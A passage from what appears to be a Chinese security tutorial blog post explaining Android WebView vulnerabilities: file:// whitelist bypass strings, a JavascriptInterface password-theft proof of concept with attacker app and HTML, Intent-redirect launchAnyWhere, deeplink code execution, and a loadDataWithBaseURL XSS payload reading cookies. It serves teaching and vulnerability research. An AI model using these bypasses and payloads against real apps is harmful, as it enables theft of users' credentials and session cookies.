<h4 id="（5）file协议绕过"><a href="#（5）file协议绕过" class="headerlink" title="（5）file协议绕过"></a>（5）file协议绕过</h4><p>APP经常会使用file:&#x2F;&#x2F;协议加载本地文件，通常会限制在一些特定路径中，参考文章：<a target="_blank" rel="noopener" href="https://mabin004.github.io/2019/04/23/Android-WebView%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/">Android WebView URL检查绕过</a></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>)不要用url.startWith(”file:<span class="comment">//”)来判断是否为file协议，因为“FILE://”(大小)、“File://”(大小写)、“ file://”(前边加空格)、“file:”等方式都可以绕过检测。url.contains(“file://”)更不靠谱，推荐使用getScheme()来判断协议；</span></span><br><span class="line">(<span class="number">2</span>)file:<span class="comment">///android_asset和file:///android_res 也可以../穿越</span></span><br><span class="line">(<span class="number">3</span>)白名单判断了“../，但通过“..\”也是可以穿越的，例如file:<span class="comment">///sdcard/..\../sdcard/1.html</span></span><br><span class="line">(<span class="number">4</span>)getHost有漏洞（file:<span class="comment">//a:a@www.qq.com:b@www.baidu.com使用getHost获取到的是qq.com,但实际访问的是baidu.com)</span></span><br><span class="line">(<span class="number">5</span>)file:<span class="comment">//baidu.com/data/data/tmp 前边的baidu.com是可以不被解析的</span></span><br><span class="line">(<span class="number">6</span>)协议头不包括<span class="comment">///，还是仍然能够正常loadUrl，如file:mnt/sdcard/filedomain.html</span></span><br><span class="line">(<span class="number">7</span>)白名单判断了“../”，但通过url编码绕过，例如file:<span class="comment">///data/data/com.app/%2e%2e/%2e%2e/%2e%2e/sdcard/xxx</span></span><br><span class="line">(<span class="number">8</span>)replace(“../“,””)可以使用”….<span class="comment">//“绕过</span></span><br></pre></td></tr></table></figure>

<h3 id="4-Intent-WebView漏洞"><a href="#4-Intent-WebView漏洞" class="headerlink" title="4.Intent+WebView漏洞"></a>4.Intent+WebView漏洞</h3><h4 id="（1）Intent访问导出组件加载恶意界面和窃取信息"><a href="#（1）Intent访问导出组件加载恶意界面和窃取信息" class="headerlink" title="（1）Intent访问导出组件加载恶意界面和窃取信息"></a>（1）Intent访问导出组件加载恶意界面和窃取信息</h4><p><strong>漏洞原理：</strong></p>
<p>主要通过 WebView 对外暴露的接口和Intent访问导出组件可以导致的攻击手段</p>
<p><strong>漏洞复现：</strong></p>
<p>我们编写一个样例代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JsIntentActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_js_intent);</span><br><span class="line">        <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> findViewById(R.id.Wind_webviewIntent);</span><br><span class="line">        webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">        webView.addJavascriptInterface(<span class="keyword">new</span> <span class="title class_">AndroidtoJs</span>(), <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        webView.loadData(<span class="string">&quot;&quot;</span>, <span class="string">&quot;text/html&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Uri</span> <span class="variable">getUri</span> <span class="operator">=</span> getIntent().getData();</span><br><span class="line">        webView.loadUrl(String.valueOf(getUri));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 提供接口在Webview中供JS调用</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AndroidtoJs</span> &#123;</span><br><span class="line">        <span class="comment">// 定义JS需要调用的方法，被JS调用的方法必须加入@JavascriptInterface注解</span></span><br><span class="line">        <span class="meta">@JavascriptInterface</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getPassword</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;WindXaa12345678&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们可以看出我们获取了密码<code>WindXaa12345678</code>，一般应用程序会对这里进行加密或者混淆，我们这里简单演示就不进行加密了</p>
<p>我们将该组件设置为导出组件</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/32.png" alt="image-20220729171422196"></p>
<p>我们对实例样本分析，这里就可以利用接口导出的漏洞进行攻击</p>
<p><strong>漏洞复现：</strong></p>
<p>我们再编写攻击样本：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> findViewById(R.id.button);</span><br><span class="line">        button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="type">Intent</span> <span class="variable">attackIntent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">                attackIntent.setClassName(<span class="string">&quot;com.iwindxaa.webview&quot;</span>,<span class="string">&quot;com.iwindxaa.webview.JsIntentActivity&quot;</span>);</span><br><span class="line">                attackIntent.setData(Uri.parse(<span class="string">&quot;http://ip地址端口号/attack.html&quot;</span>));</span><br><span class="line">                startActivity(attackIntent);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后我们在本地编写恶意的html，利用前面讲述的远程加载</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;WebView Atack&lt;/title&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">         function <span class="title function_">callAndroid</span><span class="params">()</span>&#123;</span><br><span class="line">            <span class="comment">//由于对象映射，所以调用test对象等于调用Android映射的对象</span></span><br><span class="line">            <span class="type">var</span> <span class="variable">password</span> <span class="operator">=</span> test.getPassword();</span><br><span class="line">			document.getElementById(<span class="string">&quot;getdata&quot;</span>).innerHTML= password;</span><br><span class="line">         &#125;</span><br><span class="line">     &lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">   &lt;p id=<span class="string">&quot;getdata&quot;</span>&gt;攻击获得的数据将显示在此……&lt;/p&gt;</span><br><span class="line">   &lt;!--点击按钮则调用callAndroid函数--&gt;</span><br><span class="line">   &lt;button type=<span class="string">&quot;button&quot;</span> id=<span class="string">&quot;button1&quot;</span> onclick=<span class="string">&quot;callAndroid()&quot;</span>&gt;CIntent Attack!&lt;/button&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>然后启动http_server</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/33.png" alt="image-20220729172309137"></p>
<p>此时我们启动攻击样本，并点击按钮</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/34.png" alt="image-20220729172422110"></p>
<p>这里我们可以成功的加载我们的页面说明恶意html注入成功</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/35.png" alt="image-20220729172443186"></p>
<p>然后我们再次点击js中的按钮，就可以获取敏感数据</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/36.png" alt="image-20220729172552889"></p>
<p>这里就获取的敏感的数据</p>
<h4 id="（2）Intent重定向导致launchAnyWhere漏洞"><a href="#（2）Intent重定向导致launchAnyWhere漏洞" class="headerlink" title="（2）Intent重定向导致launchAnyWhere漏洞"></a>（2）Intent重定向导致launchAnyWhere漏洞</h4><p><strong>漏洞原理：</strong></p>
<p>我们都知道Android中的组件需要导出才能够访问，而导出的组件往往存在一定的安全问题。</p>
<p>导出的组件一般有以下三种形式：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>在AndroidManifest.xml中的组件如果显式设置了组件属性android:exported值为<span class="literal">true</span>;</span><br><span class="line"><span class="number">2.</span>如果组件没有显式设置android:exported为<span class="literal">false</span>，但是其intent-filter以及action存在，则也为导出组件</span><br><span class="line"><span class="number">3.</span>API Level在<span class="number">17</span>以下的所有App的provider组件的android:exported属性默认值为<span class="literal">true</span>，<span class="number">17</span>及以上默认值为<span class="literal">false</span>。</span><br></pre></td></tr></table></figure>

<p>未导出的组件：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">组件显式设置android:exported=<span class="string">&quot;false&quot;</span> </span><br><span class="line">组件没有intent-filter, 且没有显式设置android:exported的属性值，默认为非导出的;</span><br><span class="line">组件虽然配置了intent-filter,，但是显式设置android:exported=<span class="string">&quot;false&quot;</span></span><br></pre></td></tr></table></figure>

<p>而通过一定的方法可以访问未导出的组件，我们将这种漏洞成为<code>launchAnyWhere</code>漏洞</p>
<p>Intent可以通过重定向的原理，通过携带数据信息，访问一个可导出的组件，然后再进行数据传递去触发不可导出的组件，最后实现访问私有组件的目的，引起<code>launchAnyWhere</code>漏洞</p>
<p><strong>漏洞复现：</strong></p>
<p>我们查看一个样本案例：</p>
<p>首先是不可导出组件PrivateActivity:</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/53.png" alt="image-20220730124850689"></p>
<p>然后可导出的组件：WebView2Activity</p>
<p>代码层的校验代码：</p>
<p><code>WebView2Activity</code></p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/54.png" alt="image-20220730125041041"></p>
<p><code>PrivateActivity</code></p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/55.png" alt="image-20220730125108657"></p>
<p>然后我们编写攻击代码：</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/56.png" alt="image-20220730125254413"></p>
<p>效果如下：</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/57.png" alt="image-20220730125323004"></p>
<p>可以看出我们通过WebView+Intent重定向就可以访问私有组件，从而实现launchAnyWhere漏洞</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/58.png" alt="image-20220730125359818"></p>
<h3 id="5-Deeplink-WebView漏洞"><a href="#5-Deeplink-WebView漏洞" class="headerlink" title="5.Deeplink+WebView漏洞"></a>5.Deeplink+WebView漏洞</h3><p>deeplink 是一种在网页中启动App的超链接。当用户点击deeplink链接时，Android系统会启动注册该deeplink的应用，打开在Manifest文件中注册该deeplink的activity。</p>
<p>deeplink在APP中会导致多类漏洞：通过deeplink操纵WebView造成的远程代码执行、敏感信息泄露、应用克隆、launchAnyWhere等漏洞。</p>
<h4 id="（1）任意代码执行漏洞"><a href="#（1）任意代码执行漏洞" class="headerlink" title="（1）任意代码执行漏洞"></a>（1）任意代码执行漏洞</h4><p><strong>漏洞原理：</strong></p>
<p>样本代码层通过反射调用去安装的列表中搜索安装的应用，然后去调用其方法进行实现，我们可以构造相同的包名，然后将攻击样本去安装到手机上，是的应用触发任意代码执行漏洞</p>
<p><strong>漏洞复现：</strong></p>
<p>样本代码段：</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/59.png" alt="image-20220730125800892"></p>
<p>我们构造Poc：</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/60.png" alt="image-20220730125820419"></p>
<p>注意这里我们要保证构造的攻击应用的包名和代码中校验的一致才能触发，然后我们启动，可以发现成功的触发了</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/61.png" alt="image-20220730125901727"></p>
<p><strong>漏洞防护：</strong></p>
<p>需要对具体的包名进行校验，并对DeepLink进行过滤</p>
<h4 id="（2）XSS注入漏洞"><a href="#（2）XSS注入漏洞" class="headerlink" title="（2）XSS注入漏洞"></a>（2）XSS注入漏洞</h4><p><strong>漏洞原理：</strong></p>
<p>这也是我们结合Deeplink+WebView导致的一个漏洞问题，我们可以通过构造含深度调用链的JS，然后通过加载去实现XSS注入</p>
<p><strong>漏洞复现：</strong></p>
<p>首先我们查看样本的DeepLinks</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/62.png" alt="image-20220730130234190"></p>
<p>然后我们可以发现样本的代码：</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/63.png" alt="image-20220730130256549"></p>
<p>我们构造攻击脚本：</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/64.png" alt="image-20220730130336427"></p>
<p>然后我们通过去访问该html:</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/65.png" alt="image-20220730130416578"></p>
<p>接着我们使用目标样本打开：</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/66.png" alt="image-20220730130442740"></p>
<p>即可以成功的进行XSS注入</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/67.png" alt="image-20220730130506890"></p>
<h4 id="（3）DeepLinks在WebView上的组合漏洞"><a href="#（3）DeepLinks在WebView上的组合漏洞" class="headerlink" title="（3）DeepLinks在WebView上的组合漏洞"></a>（3）DeepLinks在WebView上的组合漏洞</h4><p>我们前面分析了很多DeepLinks在WebView上的漏洞，我们还可以将这些漏洞组合使用，我在测试一款银行的样本中发现组合漏洞：</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/68.png" alt="image-20220730130714437"></p>
<p>这个结合了前面我们讲的网络漏洞、路径穿越、XSS、WebView漏洞，具体的大家可以去听我在平安SRC&amp;&amp;看雪的沙龙会议中的演讲。</p>
<p>以及我在网上收集的一个大佬的文章，描述的漏洞利用流程，大家可以参考：</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/76.png" alt="image-20220730141930818"></p>
<p>参考文章：<a target="_blank" rel="noopener" href="http://blog.nsfocus.net/app-vulnerability-exploitation-combination-boxing/">APP漏洞利用组合拳——应用克隆案例分析</a></p>
<h4 id="（4）loadDataWithBaseURL漏洞"><a href="#（4）loadDataWithBaseURL漏洞" class="headerlink" title="（4）loadDataWithBaseURL漏洞"></a>（4）loadDataWithBaseURL漏洞</h4><p>当<code>loadDataWithBaseURL</code>的域名和内容同时可控是，可以构造任意域下的XSS</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">loadDataWithBaseURL</span> </span><br><span class="line"><span class="params">(String baseUrl,</span></span><br><span class="line"><span class="params">String data, </span></span><br><span class="line"><span class="params">String mimeType, </span></span><br><span class="line"><span class="params">String encoding,</span></span><br><span class="line"><span class="params">String historyUrl)</span></span><br></pre></td></tr></table></figure>

<p>除了明显的情况外，攻击者控制调用中的<code>baseUri</code>和参数<code>data</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">webView.loadDataWithBaseURL(<span class="string">&quot;https://google.com/&quot;</span>,</span><br><span class="line">           <span class="string">&quot;&lt;script&gt;document.write(document.domain)&lt;/script&gt;&quot;</span>,</span><br><span class="line">           <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure>

<p><strong>漏洞原理：</strong></p>
<p>deeplink加载任意fragment，转化为WebView loadDataWithBaseURL漏洞</p>
<p><strong>漏洞复现：</strong></p>
<p>实现步骤：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(1)victim-app://c/contact/2?fragmen_class=&lt;fragment&gt;可启动任意fragment，并可 通过Intent Extra传参</span><br><span class="line">(2)寻找到⼀个带WebView的Fragment：GoogleMapWebViewFragment</span><br><span class="line">(3)可污染loadDataWithBaseURL的前两个参数，构造victim.com域下的XSS</span><br><span class="line">webview.loadDataWithBaseURL(&quot;victim.com&quot;,&quot;google-map.html&quot;,	&quot;text/html&quot;,	...);</span><br></pre></td></tr></table></figure>

<p>攻击代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(Intent.ACTION_VIEW); </span><br><span class="line">payload.setData(Uri.parse(<span class="string">&quot;victim-app://c/contact/2?fragmen_class=com.victim.app.GoogleWebViewMapFragment&quot;</span>)); </span><br><span class="line"><span class="type">Bundle</span> <span class="variable">extra</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Bundle</span>(); </span><br><span class="line">extra.putString(<span class="string">&quot;map_url&quot;</span>, <span class="string">&quot;\&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&lt;script&gt;&quot;</span>); </span><br><span class="line">extra.putString(<span class="string">&quot;map_file_name&quot;</span>, <span class="string">&quot;google_map.html&quot;</span>); </span><br><span class="line">extra.putString(<span class="string">&quot;map_domain&quot;</span>, <span class="string">&quot;https://www.victim-app.com&quot;</span>); </span><br><span class="line">payload.putExtra(<span class="string">&quot;bundle&quot;</span>, extra); </span><br><span class="line">startActivity(payload);</span><br></pre></td></tr></table></figure>

<p>可以通过这个deeplink打开任意fragment的漏洞，实现可控任意域执行任意JS，实现盗取登陆态的用户cookie！</p>
<p>具体参考：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/81Lq-JwASnkSS2wg62HSvA">Android中的特殊攻击面（二）——危险的deeplink</a></p>
<h2 id="五、实验总结"><a href="#五、实验总结" class="headerlink" title="五、实验总结"></a>五、实验总结</h2><p>本文我编写了很久，主要是一些案例和网上的漏洞复现需要大量的时间去做，很多案例和攻击poc，我都进行了手动编写，一些网上已有的大佬的文章样例，我也进行了一一的复现，将一些不能复现的全部剔除，WebView漏洞是Android APP上当前十分重要的漏洞，漏洞的种类十分多，本文归纳了20多种类别的漏洞并进行了一一的复现，具体漏洞扩展，大家可以参考后面的文献，而实验的poc和攻击样本我也会上传知识星球和github。</p>
<p>github网址：<a target="_blank" rel="noopener" href="https://github.com/WindXaa">WindXaa</a></p>
<h2 id="六、参考文献"><a href="#六、参考文献" class="headerlink" title="六、参考文献"></a>六、参考文献</h2><p>会议：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2020 看雪SDC  Android WebView安全攻防指南2020</span><br></pre></td></tr></table></figure>

<p>WebView的原理：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://ljd1996.github.io/2020/12/01/Android-WebView%E7%AC%94%E8%AE%B0/</span><br><span class="line">https://blog.csdn.net/carson_ho/article/details/64904691</span><br><span class="line">https://juejin.cn/post/6844903564737789965#heading-9</span><br><span class="line">https://www.cnblogs.com/linhaostudy/p/14617314.html</span><br><span class="line">https://mabin004.github.io/2018/06/11/Android-JsBridge/</span><br></pre></td></tr></table></figure>

<p>远程代码执行漏洞：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://cloud.tencent.com/developer/article/1394368</span><br><span class="line">https://blog.csdn.net/weixin_39190897/article/details/125107626</span><br></pre></td></tr></table></figure>

<p>WebView跨域漏洞：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://blogs.360.cn/post/webview%E8%B7%A8%E6%BA%90%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90.html</span><br><span class="line">https://blog.csdn.net/qq_35993502/article/details/121371049</span><br><span class="line">https://bbs.pediy.com/thread-269849.htm</span><br><span class="line">https://forum.butian.net/share/1562</span><br></pre></td></tr></table></figure>

<p>URL配置漏洞：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.freebuf.com/articles/terminal/201407.html</span><br><span class="line">https://mabin004.github.io/2019/04/23/Android-WebView%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/</span><br><span class="line">https://www.freebuf.com/articles/web/208868.html</span><br></pre></td></tr></table></figure>

<p>Intent Scheme绕过：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://drops.xmd5.com/static/drops/papers-2893.html</span><br><span class="line">https://blog.csdn.net/l173864930/article/details/36951805</span><br></pre></td></tr></table></figure>

<p>Intent:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://blogs.360.cn/post/launchanywhere-google-bug-7699048.html</span><br><span class="line">http://drops.xmd5.com/static/drops/papers-2893.html</span><br></pre></td></tr></table></figure>

<p>deeplink:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://mp.weixin.qq.com/s/81Lq-JwASnkSS2wg62HSvA?</span><br><span class="line">http://blog.nsfocus.net/app-vulnerability-exploitation-combination-boxing/</span><br></pre></td></tr></table></figure>


    </div>

    
    
    
        

<div>
<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者： </strong>安全后厨团队 |  微信公众号【安全后厨】
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="http://security-kitchen.com/2023/02/14/bug0020/" title="Android App漏洞之战（20）——Webview漏洞详解">http://security-kitchen.com/2023/02/14/bug0020/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>


      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag"># 漏洞挖掘</a>
              <a href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag"># 工具</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2023/02/14/bug0019/" rel="prev" title="Android App漏洞之战（19）——插件化漏洞与解压缩漏洞详解">
      <i class="fa fa-chevron-left"></i> Android App漏洞之战（19）——插件化漏洞与解压缩漏洞详解
    </a></div>
      <div class="post-nav-item">
    <a href="/2023/03/08/interview0001/" rel="next" title="移动安全面试（1）——2023届科大讯飞秋季招聘">
      移动安全面试（1）——2023届科大讯飞秋季招聘 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E5%89%8D%E8%A8%80"><span class="nav-text">一、前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-text">二、基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-WebView%E5%9F%BA%E7%A1%80"><span class="nav-text">1.WebView基础</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%881%EF%BC%89WebView%E6%A6%82%E8%BF%B0"><span class="nav-text">（1）WebView概述</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%882%EF%BC%89WebView%E4%BD%9C%E7%94%A8"><span class="nav-text">（2）WebView作用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%883%EF%BC%89WebView%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8"><span class="nav-text">（3）WebView基础使用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#lt-1-gt-%E6%9C%AC%E5%9C%B0%E5%8A%A0%E8%BD%BD"><span class="nav-text">&lt;1&gt;本地加载</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#lt-2-gt-%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD"><span class="nav-text">&lt;2&gt;远程加载</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-WebView%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3"><span class="nav-text">2.WebView使用详解</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%881%EF%BC%89WebView%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95"><span class="nav-text">（1）WebView常用方法</span></a></li><li 